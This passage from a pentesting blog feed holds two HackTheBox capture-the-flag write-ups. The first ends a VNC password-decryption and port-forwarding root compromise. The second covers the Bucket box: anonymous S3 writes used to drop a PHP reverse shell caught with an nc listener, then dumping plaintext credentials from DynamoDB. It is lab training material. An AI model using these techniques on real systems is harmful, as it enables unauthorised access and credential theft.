</code></pre></div><p>The file content is decrypted to <code>k!LL3rSs</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103» 
$ ./vncpwd remote_secret 
Password: k!LL3rSs
</code></pre></div><p>I tried the password on root, but it didn&rsquo;t work. Last option here is to access the VNC server.</p>
<h4 id="accessing-vnc">Accessing VNC</h4>
<p>Since the VNC server is not accessible from outside, I&rsquo;ll need a port forwarding to interact with it.</p>
<p>On thomas&rsquo;s session</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">thomas@Alfa:~$ ~C
ssh&gt; -L 5901:localhost:5901 
Forwarding port.
</code></pre></div><p>That will create a tunnel from my Kali localhost:5901 =&gt; Alfa&rsquo;s localhost:5901</p>
<p>Now I can try to connect to the VNC server using <code>vncviewer</code> (it&rsquo;s preinstalled on Kali) and provide <code>remote_secret</code> as the password file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «alfa» «192.168.2.103»  
$ vncviewer -passwd remote_secret 127.0.0.1:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Authentication successful
Desktop name <span style="color:#e6db74">&#34;Alfa:1 (root)&#34;</span>
VNC server default format:
  <span style="color:#ae81ff">32</span> bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red <span style="color:#ae81ff">255</span> green <span style="color:#ae81ff">255</span> blue 255, shift red <span style="color:#ae81ff">16</span> green <span style="color:#ae81ff">8</span> blue <span style="color:#ae81ff">0</span>
Using default colormap which is TrueColor.  Pixel format:
  <span style="color:#ae81ff">32</span> bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red <span style="color:#ae81ff">255</span> green <span style="color:#ae81ff">255</span> blue 255, shift red <span style="color:#ae81ff">16</span> green <span style="color:#ae81ff">8</span> blue <span style="color:#ae81ff">0</span>
Same machine: preferring raw encoding
</code></pre></div><p>It opens this Windows, and I&rsquo;m already on root.</p>
<p><div class="img-container"><img src="imgs/image-20210422160633799.png" alt="image-20210422160633799"  /></div>
</p>
<p>To be honest, this is actually guessing.</p>
<p>At first I doubt that this remote_secret is shared with root user, but that&rsquo;s how I pwned this machine.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc">https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Bucket</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</link>
      <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</guid>
      <description>Pentesting against simulated AWS S3 Bucket </description>
      <content:encoded><![CDATA[<p>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is  an internal web currently running as a root user, which then can be exploited to gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Pentesting AWS S3</li>
<li>Port Forwarding</li>
<li>Exploiting PD4ML</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
<li>AWS CLI - <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Scanning through all the ports return the same result.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---buckethtb">TCP 80 - bucket.htb</h3>
<p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://10.10.10.212

<span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;302 Found&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;
&lt;<span style="color:#f92672">h1</span>&gt;Found&lt;/<span style="color:#f92672">h1</span>&gt;
&lt;<span style="color:#f92672">p</span>&gt;The document has moved &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;.&lt;/<span style="color:#f92672">p</span>&gt;
&lt;<span style="color:#f92672">hr</span>&gt;
&lt;<span style="color:#f92672">address</span>&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;/<span style="color:#f92672">address</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb
</code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422234425022.png" alt="image-20210422234425022"  /></div>
</p>
<p>Inspecting the page source discovers a vhost.</p>
<p><div class="img-container"><img src="imgs/image-20210422234754897.png" alt="image-20210422234754897"  /></div>
</p>
<p>I&rsquo;ll add the vhost name to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb
</code></pre></div><h4 id="gobuster">Gobuster</h4>
<p>There&rsquo;s no interesting results.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80

...&lt;SNIP&gt;...
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5344<span style="color:#f92672">]</span>
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
</code></pre></div><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
<p>Visiting the newly discovered hostname displays a typical json output format.</p>
<p><div class="img-container"><img src="imgs/image-20210422235335494.png" alt="image-20210422235335494"  /></div>
</p>
<h4 id="gobuster-1">Gobuster</h4>
<p><code>gobuster</code> scan discovers a few web paths.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80

...&lt;SNIP&gt;...
/shell                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
/health               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 54<span style="color:#f92672">]</span>
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
</code></pre></div><h4 id="shell">/shell</h4>
<p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p>
<p><div class="img-container"><img src="imgs/image-20210424222707480.png" alt="image-20210424222707480"  /></div>
</p>
<p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.51» 
$ curl -sv http://s3.bucket.htb/shell

...&lt;SNIP&gt;...
&lt; refresh: 0; url<span style="color:#f92672">=</span>http://444af250749d:4566/shell/
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
&lt; access-control-expose-headers: x-amz-version-id
&lt; 
* Connection <span style="color:#75715e">#0 to host s3.bucket.htb left intact</span>
</code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
</code></pre></div><p>Searching some of the header names on Google reveals those are used by Amazon S3</p>
<p><div class="img-container"><img src="imgs/image-20210425002915838.png" alt="image-20210425002915838"  /></div>
</p>
<p>Adding another <code>/</code> at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.</p>
<p><div class="img-container"><img src="imgs/image-20210424223257481.png" alt="image-20210424223257481"  /></div>
</p>
<h4 id="health">/health</h4>
<p><code>/health</code> is probably an endpoint to monitor the service status.</p>
<p><div class="img-container"><img src="imgs/image-20210422235825937.png" alt="image-20210422235825937"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="aws-s3">AWS S3</h4>
<p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">aws cli</a>. You can find the user guide <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets">here</a>.</p>
<p>Usage in general:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">aws [options] s3 &lt;subcommand&gt; [parameters]
</code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
<blockquote>
<p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
You must specify a region. You can also configure your region by running <span style="color:#e6db74">&#34;aws configure&#34;</span>.
</code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws configure
AWS Access Key ID <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
AWS Secret Access Key <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
Default region name <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>: us-east-1
Default output format <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
</code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
2020-10-21 09:16:03 adserver
</code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
                           PRE images/
2020-10-21 09:22:04       <span style="color:#ae81ff">5344</span> index.html

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/images/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
2020-10-21 09:52:04      <span style="color:#ae81ff">37840</span> bug.jpg
2020-10-21 09:52:04      <span style="color:#ae81ff">51485</span> cloud.png
2020-10-21 09:52:04      <span style="color:#ae81ff">16486</span> malware.png
</code></pre></div><p>Those files are the same files seen in <code>bucket.htb</code>.</p>
<h4 id="php-reverse-shell-upload-via-s3">PHP Reverse Shell upload via S3</h4>
<p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy">source</a>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws s3 cp &lt;source&gt; &lt;target&gt; <span style="color:#f92672">[</span>--options<span style="color:#f92672">]</span>
</code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test files and upload it to the bucket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ echo <span style="color:#e6db74">&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
upload: ./iamf-test.php to s3://adserver/iamf-test.php 
</code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
                           PRE images/
2021-04-22 14:05:15         <span style="color:#ae81ff">21</span> iamf-test.php
2021-04-22 14:05:04       <span style="color:#ae81ff">5344</span> index.html
</code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of php code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
&lt;?php echo <span style="color:#e6db74">&#34;IamF&#34;</span> ?&gt;

→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf-test.php
IamF
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423010636324.png" alt="image-20210423010636324"  /></div>
</p>
<p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
</code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf.php
</code></pre></div><p>I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.212<span style="color:#f92672">]</span> <span style="color:#ae81ff">58352</span>
Linux bucket 5.4.0-48-generic <span style="color:#75715e">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 18:14:02 up 13:18,  <span style="color:#ae81ff">0</span> users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1050<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@bucket:/$ 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423011428675.png" alt="image-20210423011428675"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-roy">Shell as roy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is a <code>bucket-app</code>, but I don&rsquo;t have access to it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-xr-x   <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
drwxr-xr-x  <span style="color:#ae81ff">14</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
drwxr-x---+  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 bucket-app
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 18:27 html
</code></pre></div><p><code>roy</code> is the only user in this box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
roy:x:1000:1000:,,,:/home/roy:/bin/bash
</code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la /home/roy
total <span style="color:#ae81ff">44</span>
drwxr-xr-x <span style="color:#ae81ff">7</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .
drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
drwxrwxr-x <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .aws
lrwxrwxrwx <span style="color:#ae81ff">1</span> roy  roy     <span style="color:#ae81ff">9</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">220</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy  <span style="color:#ae81ff">3771</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bashrc
drwx------ <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:57 .cache
drwx------ <span style="color:#ae81ff">4</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 08:01 .gnupg
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">807</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .profile
drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 project
drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 snap
-r-------- <span style="color:#ae81ff">1</span> roy  roy    <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">22</span> 04:56 user.txt
</code></pre></div><p>The files inside <code>project</code> are readable by others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ ls -la
total <span style="color:#ae81ff">44</span>
drwxr-xr-x  <span style="color:#ae81ff">3</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> .
drwxr-xr-x  <span style="color:#ae81ff">5</span> roy roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">24</span> 17:31 ..
-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy    <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.json
-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.lock
-rw-r--r--  <span style="color:#ae81ff">1</span> roy roy   <span style="color:#ae81ff">367</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> db.php
drwxrwxr-x <span style="color:#ae81ff">10</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> vendor
</code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ cat db.php

&lt;?php
require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\E</span>xception<span style="color:#ae81ff">\D</span>ynamoDbException;

$client <span style="color:#f92672">=</span> new Aws<span style="color:#ae81ff">\S</span>dk<span style="color:#f92672">([</span>
    <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
    <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
    <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
    <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
<span style="color:#f92672">])</span>;

$dynamodb <span style="color:#f92672">=</span> $client-&gt;createDynamoDb<span style="color:#f92672">()</span>;

//todo
</code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566

<span style="color:#f92672">{</span>
	<span style="color:#e6db74">&#34;s3&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, 
	<span style="color:#e6db74">&#34;dynamodb&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>
<span style="color:#f92672">}</span>
</code></pre></div><h4 id="aws-dynamodb">AWS DynamoDB</h4>
<p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p>
<p>General usage:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">usage: aws <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> dynamodb &lt;subcommand&gt; <span style="color:#f92672">[</span>&lt;subcommand&gt; ...<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>parameters<span style="color:#f92672">]</span>
</code></pre></div><p>Anonymous user is allowed to list the database tables.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#e6db74">&#34;users&#34;</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;Items&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Management@#1@#&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Mgmt&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>,
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
